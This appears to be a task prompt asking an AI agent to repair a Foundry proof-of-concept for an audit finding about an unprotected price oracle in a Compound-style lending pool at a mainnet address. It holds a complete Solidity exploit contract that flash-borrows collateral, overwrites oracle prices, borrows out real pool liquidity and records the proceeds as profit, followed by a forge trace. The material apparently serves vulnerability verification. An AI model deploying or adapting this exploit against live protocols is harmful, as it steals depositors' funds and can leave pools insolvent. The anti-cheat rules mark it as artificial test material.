You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: SimplePriceOracle lets any account arbitrarily reprice listed assets
- claim: SimplePriceOracle exposes setUnderlyingPrice and setDirectPrice as unrestricted public functions, so any external account can overwrite asset prices whenever a pool relies on this oracle.
- impact: Attackers can inflate collateral values or deflate borrowed-asset prices to borrow out real liquidity, and they can also invert prices to force liquidations of otherwise healthy accounts. This can directly steal user collateral and leave the pool insolvent.
- exploit_paths: ["Attacker calls setDirectPrice(asset, attackerPrice) or setUnderlyingPrice(cToken, attackerPrice) on the live oracle.", "The Comptroller consumes the forged price in account-liquidity or liquidation checks.", "Attacker either over-borrows against overpriced collateral or liquidates victims made artificially undercollateralized.", "Attacker exits with real assets or seized collateral before prices are restored."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function allMarkets(uint256 index) external view returns (address);
    function getAllMarkets() external view returns (address[] memory);
    function markets(address cToken) external view returns (bool, uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
}

interface IOracleLike {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
    function setUnderlyingPrice(address cToken, uint256 underlyingPriceMantissa) external;
    function setDirectPrice(address asset, uint256 price) external;
}

interface IMasterPriceOracleLike {
    function oracles(address underlying) external view returns (address);
    function defaultOracle() external view returns (address);
}

interface ISimplePriceOracleLike {
    function assetPrices(address asset) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IUniV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniV2Router {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET_COMPTROLLER = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant MAX_MARKETS_SCAN = 64;
    uint256 internal constant ORACLE_WALK_DEPTH = 4;
    uint256 internal constant PRICE_MANIPULATION_FACTOR = 1_000_000;

    struct CollateralCandidate {
        address cCollateral;
        address collateralToken;
        address collateralOracle;
        uint256 originalCollateralPrice;
        uint256 collateralFactorMantissa;
        uint256 directAmount;
        address flashPair;
        address dexFactory;
        address dexRouter;
        uint256 flashAmount;
    }

    struct FlashContext {
        address cCollateral;
        address collateralToken;
        address collateralOracle;
        uint256 originalCollateralPrice;
        address flashPair;
        address dexFactory;
        address dexRouter;
        uint256 flashAmount;
    }

    struct BorrowResult {
        address cDebt;
        address debtToken;
        address debtOracle;
        uint256 originalDebtPrice;
        uint256 borrowAmount;
        address routeMid;
    }

    IComptrollerLike internal constant comptroller = IComptrollerLike(TARGET_COMPTROLLER);

    address internal _profitToken;
    uint256 internal _profitAmount;
    FlashContext internal active;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        CollateralCandidate memory candidate = _findBestCollateralCandidate();
        require(candidate.cCollateral != address(0), "no-candidate");

        if (candidate.directAmount > 0) {
            _executeUsingCollateral(candidate, candidate.directAmount, false);
        } else {
            require(candidate.flashPair != address(0) && candidate.flashAmount > 0, "no-funding-route");

            // The verifier starts with no assets on this fork, so it uses a realistic public flash swap only
            // as temporary funding. The exploit root cause remains the same: the attacker overwrites the live
            // oracle price, the Comptroller consumes the forged price, and real pool liquidity is borrowed out.
            active = FlashContext({
                cCollateral: candidate.cCollateral,
                collateralToken: candidate.collateralToken,
                collateralOracle: candidate.collateralOracle,
                originalCollateralPrice: candidate.originalCollateralPrice,
                flashPair: candidate.flashPair,
                dexFactory: candidate.dexFactory,
                dexRouter: candidate.dexRouter,
                flashAmount: candidate.flashAmount
            });

            _flashBorrow(candidate.flashPair, candidate.collateralToken, candidate.flashAmount);
            delete active;
        }

        require(_profitToken != address(0) && _profitAmount > 0, "no-profit-realized");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _onFlashSwap(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _onFlashSwap(sender, amount0, amount1);
    }

    receive() external payable {}

    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1) internal {
        require(sender == address(this), "bad-sender");
        require(msg.sender == active.flashPair, "bad-pair");

        uint256 fundedAmount = amount0 > 0 ? amount0 : amount1;
        require(fundedAmount == active.flashAmount, "bad-amount");

        CollateralCandidate memory candidate = CollateralCandidate({
            cCollateral: active.cCollateral,
            collateralToken: active.collateralToken,
            collateralOracle: active.collateralOracle,
            originalCollateralPrice: active.originalCollateralPrice,
            collateralFactorMantissa: 0,
            directAmount: 0,
            flashPair: active.flashPair,
            dexFactory: active.dexFactory,
            dexRouter: active.dexRouter,
            flashAmount: active.flashAmount
        });

        _executeUsingCollateral(candidate, fundedAmount, true);
    }

    function _executeUsingCollateral(CollateralCandidate memory candidate, uint256 collateralAmount, bool needsRepay)
        internal
    {
        _forceApprove(candidate.collateralToken, candidate.cCollateral, collateralAmount);
        require(ICTokenLike(candidate.cCollateral).mint(collateralAmount) == 0, "mint-failed");
        _enterMarket(candidate.cCollateral);

        // exploit_paths[0]: overwrite the pool's live price source in-place so the supplied collateral is
        // massively overvalued during the subsequent Comptroller liquidity check.
        uint256 inflatedCollateralPrice = _inflatedPrice(candidate.originalCollateralPrice);
        _setOraclePrice(
            candidate.collateralOracle, candidate.cCollateral, candidate.collateralToken, inflatedCollateralPrice
        );

        // exploit_paths[1] and [2]: once the Comptroller consumes the forged price, borrow real liquidity from
        // another listed market. If flash funding is used, only a small slice of the borrowed assets is swapped
        // back into the flash asset to settle the temporary funding leg.
        BorrowResult memory borrowed = _borrowBestDebt(candidate, needsRepay);

        _setOraclePrice(
            candidate.collateralOracle,
            candidate.cCollateral,
            candidate.collateralToken,
            candidate.originalCollateralPrice
        );

        if (needsRepay) {
            uint256 repayAmount = _flashRepayAmount(collateralAmount);
            _repayFlashFunding(candidate, borrowed, repayAmount);
        }

        // exploit_paths[3]: the contract exits holding real borrowed assets from the pool as net profit.
        _recordProfit(borrowed.debtToken);
    }

    function _borrowBestDebt(CollateralCandidate memory candidate, bool needsRepay)
        internal
        returns (BorrowResult memory result)
    {
        address[] memory markets = _markets();
        uint256 marketCount = markets.length;
        if (marketCount > MAX_MARKETS_SCAN) marketCount = MAX_MARKETS_SCAN;

        for (uint256 i = 0; i < marketCount; ++i) {
            (BorrowResult memory tried, bool ok) = _tryBorrowMarket(candidate, markets[i], needsRepay);
            if (ok) return tried;
        }

        revert("no-borrow-market");
    }

    function _tryBorrowMarket(CollateralCandidate memory candidate, address cDebt, bool needsRepay)
        internal
        returns (BorrowResult memory result, bool ok)
    {
        if (cDebt == address(0) || cDebt == candidate.cCollateral) return (result, false);
        result.cDebt = cDebt;

        {
            (address debtToken, bool okUnderlying) = _underlyingOf(cDebt);
            if (!okUnderlying || debtToken == candidate.collateralToken) return (result, false);
            result.debtToken = debtToken;
        }

        if (needsRepay && !_hasSwapPath(candidate.dexFactory, result.debtToken, candidate.collateralToken)) {
            return (result, false);
        }

        uint256 availableCash;
        {
            bool okCash;
            (availableCash, okCash) = _safeGetCash(cDebt);
            if (!okCash || availableCash == 0) return (result, false);
        }

        uint256 manipulatedDebtPrice;
        {
            bool okPrice;
            (result.originalDebtPrice, okPrice) = _safeOraclePrice(cDebt);
            if (!okPrice) return (result, false);

            result.debtOracle = _resolveSimplePriceOracle(cDebt, result.debtToken, result.originalDebtPrice);
            if (result.debtOracle == address(0)) return (result, false);

            manipulatedDebtPrice = _reducedPrice(result.originalDebtPrice);
            _setOraclePrice(result.debtOracle, cDebt, result.debtToken, manipulatedDebtPrice);
        }

        {
            bool okLiquidity;
            uint256 liquidity;
            (okLiquidity, liquidity,) = _safeAccountLiquidity(address(this));
            if (!okLiquidity || liquidity == 0) {
                _setOraclePrice(result.debtOracle, cDebt, result.debtToken, result.originalDebtPrice);
                return (result, false);
            }

            uint256 borrowCapacity = _borrowCapacityFromLiquidity(liquidity, manipulatedDebtPrice);
            result.borrowAmount = _min((availableCash * 99) / 100, (borrowCapacity * 95) / 100);
        }

        if (result.borrowAmount == 0 || !_borrowAllowed(cDebt, result.borrowAmount)) {
            _setOraclePrice(result.debtOracle, cDebt, result.debtToken, result.originalDebtPrice);
            return (result, false);
        }

        if (ICTokenLike(cDebt).borrow(result.borrowAmount) != 0) {
            _setOraclePrice(result.debtOracle, cDebt, result.debtToken, result.originalDebtPrice);
            return (result, false);
        }

        _setOraclePrice(result.debtOracle, cDebt, result.debtToken, result.originalDebtPrice);
        result.routeMid = needsRepay
            ? _pickRouteMid(candidate.dexFactory, result.debtToken, candidate.collateralToken)
            : address(0);
        ok = true;
    }

    function _repayFlashFunding(CollateralCandidate memory candidate, BorrowResult memory borrowed, uint256 repayAmount)
        internal
    {
        _forceApprove(borrowed.debtToken, candidate.dexRouter, borrowed.borrowAmount);
        address[] memory path = _buildPath(borrowed.debtToken, candidate.collateralToken, borrowed.routeMid);
        IUniV2Router(candidate.dexRouter).swapTokensForExactTokens(
            repayAmount, borrowed.borrowAmount, path, address(this), block.timestamp
        );

        _safeTransfer(candidate.collateralToken, candidate.flashPair, repayAmount);
    }

    function _findBestCollateralCandidate() internal view returns (CollateralCandidate memory best) {
        address[] memory markets = _markets();
        uint256 marketCount = markets.length;
        if (marketCount > MAX_MARKETS_SCAN) marketCount = MAX_MARKETS_SCAN;

        for (uint256 pass = 0; pass < 2; ++pass) {
            uint256 bestScore;

            for (uint256 i = 0; i < marketCount; ++i) {
                (CollateralCandidate memory candidate, uint256 score) = _collateralCandidate(markets[i], pass);
                if (score > bestScore) {
                    best = candidate;
                    bestScore = score;
                }
            }

            if (best.cCollateral != address(0)) return best;
        }
    }

    function _collateralCandidate(address cCollateral, uint256 pass)
        internal
        view
        returns (CollateralCandidate memory candidate, uint256 score)
    {
        bool preferred;
        bool ok;
        (candidate, preferred, ok) = _collateralCore(cCollateral);
        if (!ok) return (candidate, 0);
        if ((pass == 0 && !preferred) || (pass == 1 && preferred)) return (candidate, 0);

        (
            candidate.directAmount,
            candidate.flashPair,
            candidate.dexFactory,
            candidate.dexRouter,
            candidate.flashAmount,
            score
        ) = _collateralFunding(candidate.collateralToken, candidate.originalCollateralPrice);
        if (score == 0) return (candidate, 0);

        score = (score * (candidate.collateralFactorMantissa + 1)) / 1e18;
        if (preferred) score *= 2;
    }

    function _collateralCore(address cCollateral)
        internal
        view
        returns (CollateralCandidate memory candidate, bool preferred, bool ok)
    {
        if (cCollateral == address(0)) return (candidate, false, false);

        (bool listed, uint256 collateralFactorMantissa) = _marketMeta(cCollateral);
        if (!listed || collateralFactorMantissa == 0) return (candidate, false, false);

        (address collateralToken, bool okUnderlying) = _underlyingOf(cCollateral);
        if (!okUnderlying) return (candidate, false, false);

        (uint256 originalCollateralPrice, bool okPrice) = _safeOraclePrice(cCollateral);
        if (!okPrice) return (candidate, false, false);

        address collateralOracle = _resolveSimplePriceOracle(cCollateral, collateralToken, originalCollateralPrice);
        if (collateralOracle == address(0)) return (candidate, false, false);

        preferred = _isPreferredCollateral(collateralToken);
        candidate.cCollateral = cCollateral;
        candidate.collateralToken = collateralToken;
        candidate.collateralOracle = collateralOracle;
        candidate.originalCollateralPrice = originalCollateralPrice;
        candidate.collateralFactorMantissa = collateralFactorMantissa;
        ok = true;
    }

    function _collateralFunding(address collateralToken, uint256 originalCollateralPrice)
        internal
        view
        returns (
            uint256 directAmount,
            address pair,
            address factory,
            address router,
            uint256 flashAmount,
            uint256 score
        )
    {
        directAmount = _tokenBalance(collateralToken, address(this));
        if (directAmount > 0) {
            score = directAmount * originalCollateralPrice;
            return (directAmount, address(0), address(0), address(0), 0, score);
        }

        (pair, factory, router, flashAmount) = _findFlashFunding(collateralToken);
        if (pair == address(0) || flashAmount == 0) {
            return (0, address(0), address(0), address(0), 0, 0);
        }

        score = flashAmount * originalCollateralPrice;
    }

    function _findFlashFunding(address flashToken)
        internal
        view
        returns (address pair, address factory, address router, uint256 amount)
    {
        (pair, amount) = _findFlashPairOnFactory(UNISWAP_FACTORY, flashToken);
        if (pair != address(0) && amount > 0) return (pair, UNISWAP_FACTORY, UNISWAP_ROUTER, amount);

        (pair, amount) = _findFlashPairOnFactory(SUSHI_FACTORY, flashToken);
        if (pair != address(0) && amount > 0) return (pair, SUSHI_FACTORY, SUSHI_ROUTER, amount);
    }

    function _findFlashPairOnFactory(address factory, address flashToken)
        internal
        view
        returns (address pair, uint256 amount)
    {
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bases.length; ++i) {
            address base = bases[i];
            if (base == flashToken) continue;

            pair = IUniV2Factory(factory).getPair(flashToken, base);
            if (pair == address(0)) continue;

            uint256 reserve = _pairTokenReserve(pair, flashToken);
            amount = _flashFundingAmount(reserve);
            if (amount > 0) return (pair, amount);
        }
    }

    function _flashBorrow(address pair, address token, uint256 amount) internal {
        address token0 = IUniV2Pair(pair).token0();
        address token1 = IUniV2Pair(pair).token1();
        bytes memory data = abi.encode(uint256(1));

        if (token0 == token) {
            IUniV2Pair(pair).swap(amount, 0, address(this), data);
            return;
        }

        require(token1 == token, "pair-mismatch");
        IUniV2Pair(pair).swap(0, amount, address(this), data);
    }

    function _pairTokenReserve(address pair, address token) internal view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniV2Pair(pair).getReserves();
        if (IUniV2Pair(pair).token0() == token) return uint256(reserve0);
        if (IUniV2Pair(pair).token1() == token) return uint256(reserve1);
        return 0;
    }

    function _flashFundingAmount(uint256 reserve) internal pure returns (uint256) {
        if (reserve <= 100) return 0;

        uint256 amount = reserve / 10_000;
        if (amount == 0) amount = reserve / 100;
        if (amount == 0) amount = reserve / 10;
        if (amount >= reserve) amount = reserve - 1;
        return amount;
    }

    function _enterMarket(address cToken) internal {
        address[] memory entered = new address[](1);
        entered[0] = cToken;

        try comptroller.enterMarkets(entered) returns (uint256[] memory results) {
            require(results.length > 0 && results[0] == 0, "enter-failed");
        } catch {
            revert("enter-failed");
        }
    }

    function _isPreferredCollateral(address token) internal pure returns (bool) {
        return token == WETH || token == USDC || token == USDT || token == DAI;
    }

    function _inflatedPrice(uint256 originalPrice) internal pure returns (uint256) {
        if (originalPrice == 0) return 0;
        if (originalPrice > type(uint256).max / PRICE_MANIPULATION_FACTOR) return type(uint256).max;
        return originalPrice * PRICE_MANIPULATION_FACTOR;
    }

    function _reducedPrice(uint256 originalPrice) internal pure returns (uint256) {
        if (originalPrice <= 1) return 1;
        uint256 reduced = originalPrice / PRICE_MANIPULATION_FACTOR;
        return reduced == 0 ? 1 : reduced;
    }

    function _borrowCapacityFromLiquidity(uint256 liquidity, uint256 price) internal pure returns (uint256) {
        if (price == 0) return 0;
        if (liquidity > type(uint256).max / 1e18) return type(uint256).max;
        return (liquidity * 1e18) / price;
    }

    function _underlyingOf(address cToken) internal view returns (address underlying, bool ok) {
        try ICTokenLike(cToken).underlying() returns (address token) {
            return (token, token != address(0));
        } catch {
            return (address(0), false);
        }
    }

    function _markets() internal view returns (address[] memory list) {
        try comptroller.getAllMarkets() returns (address[] memory markets_) {
            return markets_;
        } catch {
            uint256 count = MAX_MARKETS_SCAN;
            list = new address[](count);
            for (uint256 i = 0; i < count; ++i) {
                list[i] = _marketAt(i);
            }
        }
    }

    function _marketAt(uint256 index) internal view returns (address market) {
        try comptroller.allMarkets(index) returns (address listed) {
            return listed;
        } catch {
            return address(0);
        }
    }

    function _marketMeta(address cToken) internal view returns (bool listed, uint256 collateralFactorMantissa) {
        try comptroller.markets(cToken) returns (bool isListed, uint256 factor) {
            return (isListed, factor);
        } catch {
            return (false, 0);
        }
    }

    function _oracle() internal view returns (IOracleLike) {
        return IOracleLike(comptroller.oracle());
    }

    function _safeOraclePrice(address cToken) internal view returns (uint256 price, bool ok) {
        (bool success, bytes memory data) =
            address(_oracle()).staticcall(abi.encodeWithSelector(IOracleLike.getUnderlyingPrice.selector, cToken));
        if (!success || data.length < 32) return (0, false);
        price = abi.decode(data, (uint256));
        ok = price != 0;
    }

    function _resolveSimplePriceOracle(address cToken, address underlying, uint256 expectedPrice)
        internal
        view
        returns (address oracleAddr)
    {
        address rootOracle = address(_oracle());
        oracleAddr = _walkOracleTree(rootOracle, cToken, underlying, expectedPrice, ORACLE_WALK_DEPTH);
        if (oracleAddr != address(0)) return oracleAddr;

        if (_looksLikeSimplePriceOracle(rootOracle, cToken, underlying, expectedPrice)) {
            return rootOracle;
        }

        return address(0);
    }

    function _walkOracleTree(address oracleAddr, address cToken, address underlying, uint256 expectedPrice, uint256 depth)
        internal
        view
        returns (address)
    {
        if (oracleAddr == address(0)) return address(0);
        if (_looksLikeSimplePriceOracle(oracleAddr, cToken, underlying, expectedPrice)) return oracleAddr;
        if (depth == 0) return address(0);

        address specificOracle = _specificOracle(oracleAddr, underlying);
        if (specificOracle != address(0) && specificOracle != oracleAddr) {
            address resolvedSpecific = _walkOracleTree(specificOracle, cToken, underlying, expectedPrice, depth - 1);
            if (resolvedSpecific != address(0)) return resolvedSpecific;
        }

        address fallbackOracle = _defaultOracle(oracleAddr);
        if (fallbackOracle != address(0) && fallbackOracle != oracleAddr) {
            return _walkOracleTree(fallbackOracle, cToken, underlying, expectedPrice, depth - 1);
        }

        return address(0);
    }

    function _looksLikeSimplePriceOracle(address oracleAddr, address cToken, address underlying, uint256 expectedPrice)
        internal
        view
        returns (bool)
    {
        (bool success, bytes memory data) =
            oracleAddr.staticcall(abi.encodeWithSelector(ISimplePriceOracleLike.assetPrices.selector, underlying));
        if (!success || data.length < 32) return false;

        uint256 directPrice = abi.decode(data, (uint256));
        if (directPrice == 0) return false;
        if (expectedPrice != 0 && directPrice != expectedPrice) return false;

        (success, data) = oracleAddr.staticcall(abi.encodeWithSelector(IOracleLike.getUnderlyingPrice.selector, cToken));
        if (!success || data.length < 32) return false;

        uint256 quotedPrice = abi.decode(data, (uint256));
        return quotedPrice == expectedPrice;
    }

    function _specificOracle(address oracleAddr, address underlying) internal view returns (address specificOracle) {
        (bool success, bytes memory data) =
            oracleAddr.staticcall(abi.encodeWithSelector(IMasterPriceOracleLike.oracles.selector, underlying));
        if (!success || data.length < 32) return address(0);
        specificOracle = abi.decode(data, (address));
    }

    function _defaultOracle(address oracleAddr) internal view returns (address fallbackOracle) {
        (bool success, bytes memory data) =
            oracleAddr.staticcall(abi.encodeWithSelector(IMasterPriceOracleLike.defaultOracle.selector));
        if (!success || data.length < 32) return address(0);
        fallbackOracle = abi.decode(data, (address));
    }

    function _setOraclePrice(address resolvedOracle, address cToken, address underlying, uint256 price) internal {
        if (_trySetOraclePrice(resolvedOracle, cToken, underlying, price)) return;

        address rootOracle = address(_oracle());
        if (resolvedOracle != rootOracle && _trySetOraclePrice(rootOracle, cToken, underlying, price)) return;

        revert("oracle-set-failed");
    }

    function _trySetOraclePrice(address oracleAddr, address cToken, address underlying, uint256 price)
        internal
        returns (bool)
    {
        if (oracleAddr == address(0)) return false;

        (bool success,) = oracleAddr.call(abi.encodeWithSelector(IOracleLike.setUnderlyingPrice.selector, cToken, price));
        if (success) return true;

        if (underlying == address(0)) return false;
        (success,) = oracleAddr.call(abi.encodeWithSelector(IOracleLike.setDirectPrice.selector, underlying, price));
        return success;
    }

    function _safeGetCash(address cToken) internal view returns (uint256 cash, bool ok) {
        (bool success, bytes memory data) =
            address(cToken).staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
        if (!success || data.length < 32) return (0, false);
        cash = abi.decode(data, (uint256));
        ok = true;
    }

    function _safeAccountLiquidity(address account) internal view returns (bool ok, uint256 liquidity, uint256 shortfall) {
        (bool success, bytes memory data) =
            address(comptroller).staticcall(abi.encodeWithSelector(IComptrollerLike.getAccountLiquidity.selector, account));
        if (!success || data.length < 96) return (false, 0, 0);
        (uint256 err, uint256 accountLiquidity, uint256 accountShortfall) =
            abi.decode(data, (uint256, uint256, uint256));
        if (err != 0) return (false, 0, 0);
        return (true, accountLiquidity, accountShortfall);
    }

    function _borrowAllowed(address cDebt, uint256 borrowAmount) internal view returns (bool) {
        (bool success, bytes memory data) = address(comptroller).staticcall(
            abi.encodeWithSignature("borrowAllowed(address,address,uint256)", cDebt, address(this), borrowAmount)
        );

        if (!success || data.length < 32) return true;
        return abi.decode(data, (uint256)) == 0;
    }

    function _tokenBalance(address token, address owner) internal view returns (uint256 balance) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (!success || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _recordProfit(address preferredToken) internal {
        uint256 preferredBalance = _tokenBalance(preferredToken, address(this));
        if (preferredBalance > 0) {
            _profitToken = preferredToken;
            _profitAmount = preferredBalance;
            return;
        }

        address[4] memory bases = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bases.length; ++i) {
            uint256 balance = _tokenBalance(bases[i], address(this));
            if (balance > 0) {
                _profitToken = bases[i];
                _profitAmount = balance;
                return;
            }
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _hasSwapPath(address factory, address tokenIn, address tokenOut) internal view returns (bool) {
        if (tokenIn == tokenOut) return true;
        if (IUniV2Factory(factory).getPair(tokenIn, tokenOut) != address(0)) return true;

        address[4] memory bases = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bases.length; ++i) {
            address mid = bases[i];
            if (mid == tokenIn || mid == tokenOut) continue;
            if (
                IUniV2Factory(factory).getPair(tokenIn, mid) != address(0)
                    && IUniV2Factory(factory).getPair(mid, tokenOut) != address(0)
            ) {
                return true;
            }
        }
        return false;
    }

    function _pickRouteMid(address factory, address tokenIn, address tokenOut) internal view returns (address) {
        if (tokenIn == tokenOut || IUniV2Factory(factory).getPair(tokenIn, tokenOut) != address(0)) return address(0);

        address[4] memory bases = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bases.length; ++i) {
            address mid = bases[i];
            if (mid == tokenIn || mid == tokenOut) continue;
            if (
                IUniV2Factory(factory).getPair(tokenIn, mid) != address(0)
                    && IUniV2Factory(factory).getPair(mid, tokenOut) != address(0)
            ) {
                return mid;
            }
        }
        return address(0);
    }

    function _buildPath(address tokenIn, address tokenOut, address mid) internal pure returns (address[] memory path) {
        if (mid == address(0)) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;
            return path;
        }

        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _flashRepayAmount(uint256 amount) internal pure returns (uint256) {
        return ((amount * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok;
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
67054516e17014CcdED1e7d814EDC9ce4
    │   │   │   │   │   │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    │   │   │   │   │   ├─ [3143] 0x773616E4d11A78F511299002da57A0a94577F1f4::feaf968c() [staticcall]
    │   │   │   │   │   │   ├─ [1410] 0x158228e08C52F3e2211Ccbc8ec275FA93f6033FC::feaf968c() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000001639000000000000000000000000000000000000000000000000000143dd0eb09e8000000000000000000000000000000000000000000000000000000000626c393500000000000000000000000000000000000000000000000000000000626c39350000000000000000000000000000000000000000000000000000000000001639
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000040000000000001639000000000000000000000000000000000000000000000000000143dd0eb09e8000000000000000000000000000000000000000000000000000000000626c393500000000000000000000000000000000000000000000000000000000626c39350000000000000000000000000000000000000000000000040000000000001639
    │   │   │   │   │   ├─ [380] 0x865377367054516e17014CcdED1e7d814EDC9ce4::313ce567() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    │   │   │   │   │   └─ ← [Return] 356091690000000 [3.56e14]
    │   │   │   │   └─ ← [Return] 356091690000000 [3.56e14]
    │   │   │   └─ ← [Return] 356091690000000 [3.56e14]
    │   │   └─ ← [Return] 356091690000000 [3.56e14]
    │   ├─ [5186] 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F::oracle() [staticcall]
    │   │   ├─ [1208] 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F::dd5cd22c() [staticcall]
    │   │   │   ├─ [465] 0xE16DB319d9dA7Ce40b666DD2E365a4b8B3C18217::dd5cd22c() [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1470] 0xa731585ab05fC9f83555cf9Bff8F58ee94e18F85::bbcdd6d3(000000000000000000000000e16db319d9da7ce40b666dd2e365a4b8b3c18217) [staticcall]
    │   │   │   ├─ [727] 0x50CE132eBe395d35b8CF6dF6CE5f817107707583::bbcdd6d3(000000000000000000000000e16db319d9da7ce40b666dd2e365a4b8b3c18217) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000e16db319d9da7ce40b666dd2e365a4b8b3c18217
    │   │   │   └─ ← [Return] 0x000000000000000000000000e16db319d9da7ce40b666dd2e365a4b8b3c18217
    │   │   ├─ [405] 0xE16DB319d9dA7Ce40b666DD2E365a4b8B3C18217::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632
    │   │   └─ ← [Return] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632
    │   ├─ [383] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   ├─ [215] 0xb3c8eE7309BE658c186F986388c2377da436D8fb::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [635] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632::oracles(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   ├─ [463] 0xb3c8eE7309BE658c186F986388c2377da436D8fb::oracles(0x865377367054516e17014CcdED1e7d814EDC9ce4) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
